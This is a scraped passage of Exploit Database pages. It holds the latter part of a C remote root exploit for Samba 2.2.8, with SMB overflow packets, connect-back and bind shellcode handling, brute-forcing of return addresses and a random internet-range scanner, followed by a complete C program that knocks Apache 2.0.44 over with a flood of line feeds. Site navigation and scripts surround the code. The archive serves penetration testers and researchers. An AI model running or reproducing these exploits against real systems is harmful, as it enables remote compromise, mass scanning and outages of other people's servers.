*/netbiosheader->flags    = 0x00;netbiosheader->length   = htons(0x3C);smbheader->protocol[0]  = 0xFF;smbheader->protocol[1]  = 'S';smbheader->protocol[2]  = 'M';smbheader->protocol[3]  = 'B';smbheader->command      = 0x70;         /* start connection */smbheader->pid          = getpid() & 0xFFFF;smbheader->tid          = 0x00;smbheader->uid          = 100;memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data2, sizeof(session_data2) - 1);if(write_timer(sock, 3) == 1)if (send(sock, buffer, 64, 0) < 0) return -1;memset(response, 0x00, sizeof(response));if (read_timer(sock, 3) == 1)if (read(sock, response, sizeof(response) - 1) < 0) return -1;netbiosheader = (NETBIOS_HEADER *)response;smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));if (netbiosheader->type != 0x00) return -1;return 0;}int exploit_normal(int sock, unsigned long ret, char *shellcode){char buffer[4000];char exploit_data[] ="\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x90";int i = 0;unsigned long dummy = ret - 0x90;NETBIOS_HEADER  *netbiosheader;SMB_HEADER      *smbheader;memset(buffer, 0x00, sizeof(buffer));netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));netbiosheader->type             = 0x00;         /* session message */netbiosheader->flags            = 0x04;netbiosheader->length           = htons(2096);smbheader->protocol[0]          = 0xFF;smbheader->protocol[1]          = 'S';smbheader->protocol[2]          = 'M';smbheader->protocol[3]          = 'B';smbheader->command              = 0x32;         /* SMBtrans2 */smbheader->tid                  = 0x01;smbheader->uid                  = 100;memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);buffer[1096] = 0xEB;buffer[1097] = 0x70;for (i = 0; i < 4 * 24; i += 8) {memcpy(buffer + 1099 + i, &dummy, 4);memcpy(buffer + 1103 + i, &ret,   4);}memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),exploit_data, sizeof(exploit_data) - 1);memcpy(buffer + 1800, shellcode, strlen(shellcode));if(write_timer(sock, 3) == 1) {if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;return 0;}return -1;}int exploit_openbsd32(int sock, unsigned long ret, char *shellcode){char buffer[4000];char exploit_data[] ="\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x90";int i = 0;unsigned long dummy = ret - 0x30;NETBIOS_HEADER  *netbiosheader;SMB_HEADER      *smbheader;memset(buffer, 0x00, sizeof(buffer));netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));netbiosheader->type             = 0x00;         /* session message */netbiosheader->flags            = 0x04;netbiosheader->length           = htons(2096);smbheader->protocol[0]          = 0xFF;smbheader->protocol[1]          = 'S';smbheader->protocol[2]          = 'M';smbheader->protocol[3]          = 'B';smbheader->command              = 0x32;         /* SMBtrans2 */smbheader->tid                  = 0x01;smbheader->uid                  = 100;memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);for (i = 0; i < 4 * 24; i += 4)memcpy(buffer + 1131 + i, &dummy, 4);memcpy(buffer + 1127, &ret,      4);memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),exploit_data, sizeof(exploit_data) - 1);memcpy(buffer + 1100 - strlen(shellcode), shellcode, strlen(shellcode));if(write_timer(sock, 3) == 1) {if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;return 0;}return -1;}int main (int argc,char *argv[]){char *shellcode = NULL;char scan_ip[256];int brute       = -1;int connectback = 0;int force       = 0;int i           = 0;int ip1         = 0;int ip2         = 0;int ip3         = 0;int ip4         = 0;int opt         = 0;int port        = 139;int random      = 0;int scan        = 0;int sock        = 0;int sock2       = 0;int status      = 0;int type        = 0;int verbose     = 0;unsigned long BRUTE_DELAY       = 100000;unsigned long ret               = 0x0;unsigned long MAX_CHILDS        = 40;unsigned long STEPS             = 300;struct hostent          *he;fprintf(stdout, "samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)\n""--------------------------------------------------------------\n");while((opt = getopt(argc,argv,"b:B:c:C:d:fp:r:sS:t:v")) !=EOF) {switch(opt){case 'b':brute = atoi(optarg);if ((brute < 0) || (brute > 3)) {fprintf(stderr, "Invalid platform.\n\n");return -1;}break;case 'B':STEPS = atoi(optarg);if (STEPS == 0) STEPS++;break;case 'c':sscanf(optarg, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);connectback = 1;if (ip1 == 0 || ip2 == 0 || ip3 == 0 || ip4 == 0) {fprintf(stderr, "Invalid IP address.\n\n");return -1;}linux_connect_back[33] = ip1; bsd_connect_back[24] = ip1;linux_connect_back[34] = ip2; bsd_connect_back[25] = ip2;linux_connect_back[35] = ip3; bsd_connect_back[26] = ip3;linux_connect_back[36] = ip4; bsd_connect_back[27] = ip4;break;case 'C':MAX_CHILDS = atoi(optarg);if (MAX_CHILDS == 0) {fprintf(stderr, "Invalid number of childs.\n");return -1;}if (MAX_CHILDS > 99) {fprintf(stderr, "Too many childs, using 99. \n");MAX_CHILDS = 99;}break;case 'd':BRUTE_DELAY = atoi(optarg);break;case 'f':force = 1;break;case 'p':port = atoi(optarg);if ((port <= 0) || (port > 65535)) {fprintf(stderr, "Invalid port.\n\n");return -1;}break;case 'r':ret = strtoul(optarg, &optarg, 16);break;case 's':random  = 1;scan    = 1;break;case 'S':random  = 0;scan    = 1;sscanf(optarg, "%d.%d.%d", &ip1, &ip2, &ip3);ip3--;break;case 't':type = atoi(optarg);if (type == 0 || type > sizeof(targets) / 16) {for(i = 0; i < sizeof(targets) / 16; i++)fprintf(stdout, "%02d. %s  [0x%08x]\n", i + 1, targets[i].type, (unsigned int) targets[i].ret);fprintf(stderr, "\n");return -1;}break;case 'v':verbose = 1;break;default:usage(argv[0] == NULL ? "sambal" : argv[0]);break;}}if ((argv[optind] == NULL && scan == 0) || (type == 0 && brute == -1 && scan == 0))usage(argv[0] == NULL ? "sambal" : argv[0]);if (scan == 1)fprintf(stdout, "+ Scan mode.\n");if (verbose == 1)fprintf(stdout, "+ Verbose mode.\n");if (scan == 1) {srand(getpid());while (1) {if (random == 1) {ip1 = rand() % 255;ip2 = rand() % 255;ip3 = rand() % 255; }else {ip3++;if (ip3 > 254) { ip3 = 1; ip2++; }if (ip2 > 254) { ip2 = 1; ip1++; }if (ip1 > 254) exit(0);}for (ip4 = 0; ip4 < 255; ip4++) {i++;snprintf(scan_ip, sizeof(scan_ip) - 1, "%u.%u.%u.%u", ip1, ip2, ip3, ip4);usleep(BRUTE_DELAY);switch (fork()) {case 0:switch(is_samba(scan_ip, 2)) {case 0:fprintf(stdout, "+ [%s] Samba\n", scan_ip);break;case 1:fprintf(stdout, "+ [%s] Windows\n", scan_ip);break;default:break;}exit(0);break;case -1:fprintf(stderr, "+ fork() error\n");exit(-1);break;default:if (i > MAX_CHILDS - 2) {wait(&status);i--;}break;}}}return 0;}he = gethostbyname(argv[optind]);if (he == NULL) {fprintf(stderr, "Unable to resolve %s...\n", argv[optind]);return -1;}if (brute == -1) {if (ret == 0) ret = targets[type - 1].ret;shellcode = targets[type - 1].shellcode;if (connectback == 1) {fprintf(stdout, "+ connecting back to: [%d.%d.%d.%d:45295]\n",ip1, ip2, ip3, ip4);switch(targets[type - 1].os_type) {case 0: /* linux */shellcode = linux_connect_back;break;case 1: /* FreeBSD/NetBSD */shellcode = bsd_connect_back;break;case 2: /* OpenBSD */shellcode = bsd_connect_back;break;case 3: /* OpenBSD 3.2 Non-exec stack */shellcode = bsd_connect_back;break;}}if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {fprintf(stderr, "+ socket() error.\n");return -1;}if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) < 0) {fprintf(stderr, "+ socket() error.\n");return -1;}memcpy(&addr1.sin_addr, he->h_addr, he->h_length);memcpy(&addr2.sin_addr, he->h_addr, he->h_length);addr1.sin_family = AF_INET;addr1.sin_port   = htons(port);addr2.sin_family = AF_INET;addr2.sin_port   = htons(45295);if (connect(sock, (struct sockaddr *)&addr1, sizeof(addr1)) == -1) {fprintf(stderr, "+ connect() error.\n");return -1;}if (verbose == 1) fprintf(stdout, "+ %s\n", targets[type - 1].type);if (force == 0) {if (is_samba(argv[optind], 2) != 0) {fprintf(stderr, "+ Host is not running samba!\n\n");return -1;}fprintf(stderr, "+ Host is running samba.\n");}if (verbose == 1) fprintf(stdout, "+ Connected to [%s:%d]\n", (char *)inet_ntoa(addr1.sin_addr), port);if (start_session(sock) < 0) fprintf(stderr, "+ Session failed.\n");if (verbose == 1) fprintf(stdout, "+ Session enstablished\n");sleep(5);if (targets[type - 1].os_type != 2) {if (exploit_normal(sock, ret, shellcode) < 0) {fprintf(stderr, "+ Failed.\n");close(sock);}} else {if (exploit_openbsd32(sock, ret, shellcode) < 0) {fprintf(stderr, "+ Failed.\n");close(sock);}}sleep(2);if (connectback == 0) {if(connect(sock2, (struct sockaddr *)&addr2, sizeof(addr2)) == -1) {fprintf(stderr, "+ Exploit failed, try -b to bruteforce.\n");return -1;}fprintf(stdout, "--------------------------------------------------------------\n");shell(sock2);close(sock);close(sock2);} else {fprintf(stdout, "+ Done...\n");close(sock2);close(sock);}return 0;}signal(SIGPIPE, SIG_IGN);signal(SIGUSR1, handler);switch(brute) {case 0:if (ret == 0) ret = 0xc0000000;shellcode = linux_bindcode;fprintf(stdout, "+ Bruteforce mode. (Linux)\n");break;case 1:if (ret == 0) ret = 0xbfc00000;shellcode = bsd_bindcode;fprintf(stdout, "+ Bruteforce mode. (FreeBSD / NetBSD)\n");break;case 2:if (ret == 0) ret = 0xdfc00000;shellcode = bsd_bindcode;fprintf(stdout, "+ Bruteforce mode. (OpenBSD 3.1 and prior)\n");break;case 3:if (ret == 0) ret = 0x00170000;shellcode = bsd_bindcode;fprintf(stdout, "+ Bruteforce mode. (OpenBSD 3.2 - non-exec stack)\n");break;}memcpy(&addr1.sin_addr, he->h_addr, he->h_length);memcpy(&addr2.sin_addr, he->h_addr, he->h_length);addr1.sin_family = AF_INET;addr1.sin_port   = htons(port);addr2.sin_family = AF_INET;addr2.sin_port   = htons(45295);for (i = 0; i < 100; i++)childs[i] = -1;i = 0;if (force == 0) {if (is_samba(argv[optind], 2) != 0) {fprintf(stderr, "+ Host is not running samba!\n\n");return -1;}fprintf(stderr, "+ Host is running samba.\n");}while (OWNED == 0) {if (sock  > 2) close(sock);if (sock2 > 2) close(sock2);if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {if (verbose == 1) fprintf(stderr, "+ socket() error.\n");}else {ret -= STEPS;i++;}if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) < 0)if (verbose == 1) fprintf(stderr, "+ socket() error.\n");if ((ret & 0xff) == 0x00 && brute != 3) ret++;if (verbose == 1) fprintf(stdout, "+ Using ret: [0x%08x]\n", (unsigned int)ret);usleep(BRUTE_DELAY);switch (childs[i] = fork()) {case 0:if(Connect(sock, (char *)inet_ntoa(addr1.sin_addr), port, 2) == -1) {if (sock  > 2) close(sock);if (sock2 > 2) close(sock2);exit(-1);}if(write_timer(sock, 3) == 1) {if (start_session(sock) < 0) {if (verbose == 1) fprintf(stderr, "+ Session failed.\n");if (sock  > 2)close(sock);if (sock2 > 2) close(sock2);exit(-1);}if (brute == 3) {if (exploit_openbsd32(sock, ret, shellcode) < 0) {if (verbose == 1) fprintf(stderr, "+ Failed.\n");if (sock  > 2) close(sock);if (sock2 > 2) close(sock2);exit(-1);}}else {if (exploit_normal(sock, ret, shellcode) < 0) {if (verbose == 1) fprintf(stderr, "+ Failed.\n");if (sock  > 2) close(sock);if (sock2 > 2) close(sock2);exit(-1);}if (sock > 2) close(sock);if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) < 0) {if (sock2 > 2) close(sock2);exit(-1);}if(Connect(sock2, (char *)inet_ntoa(addr1.sin_addr), 45295, 2) != -1) {if (sock2  > 2) close(sock2);kill(getppid(), SIGUSR1);}exit(1);}exit(0);break;case -1:fprintf(stderr, "+ fork() error\n");exit(-1);break;default:if (i > MAX_CHILDS - 2) {wait(&status);i--;}break;}}}return 0;}// milw0rm.com [2003-04-10]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 11
Apache 2.0.44 (Linux) - Remote Denial of Service - Linux dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDApache 2.0.44 (Linux) - Remote Denial of ServiceEDB-ID:11CVE:2003-0132EDB Verified:Author:Daniel NystramType:dosExploit:/Platform:LinuxDate:2003-04-11Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/******** th-apachedos.c ********************************************************* ** Remote Apache DoS exploit ** ------------------------- ** Written as a poc for the: *** This program sends 8000000 \n's to exploit the Apache memory leak. ** Works from scratch under Linux, as opposed to apache-massacre.c . **** Daniel Nyström <exce@netwinder.nu> *** - www.telhack.tk - ********************************************************** th-apachedos.c ********/#include <stdio.h>#include <stdlib.h>#include <string.h>#include <errno.h>#include <sys/types.h>#include <netinet/in.h>#include <netdb.h>#include <sys/socket.h>int main(int argc, char *argv[]){int sockfd;int count;char buffer[8000000];struct sockaddr_in target;struct hostent *he;if (argc != 3){fprintf(stderr, "\nTH-apachedos.c - Apache <= 2.0.44 DoS exploit.");fprintf(stderr, "\n----------------------------------------------");fprintf(stderr, "\nUsage: %s <Target> <Port>\n\n", argv[0]);exit(-1);}printf("\nTH-Apache DoS\n");printf("-------------\n");printf("-> Starting...\n");printf("->\n");// memset(buffer, '\n', sizeof(buffer)); /* testing */for (count = 0; count < 8000000;){buffer[count] = '\r'; /* 0x0D */count++;buffer[count] = '\n'; /* 0x0A */count++;}if ((he=gethostbyname(argv[1])) == NULL){herror("gethostbyname() failed ");exit(-1);}memset(&target, 0, sizeof(target));target.sin_family = AF_INET;target.sin_port = htons(atoi(argv[2]));target.sin_addr = *((struct in_addr *)he->h_addr);printf("-> Connecting to %s:%d...\n", inet_ntoa(target.sin_addr), atoi(argv[2]));printf("->\n");if ((sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){perror("socket() failed ");exit(-1);}if (connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) < 0){perror("connect() failed ");exit(-1);}printf("-> Connected to %s:%d... Sending linefeeds...\n", inet_ntoa(target.sin_addr),atoi(argv[2]));printf("->\n");if (send(sockfd, buffer, strlen(buffer), 0) != strlen(buffer)){perror("send() failed ");exit(-1);close(sockfd);}close(sockfd);printf("-> Finished smoothly, check hosts apache...\n\n");}// milw0rm.com [2003-04-11]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + 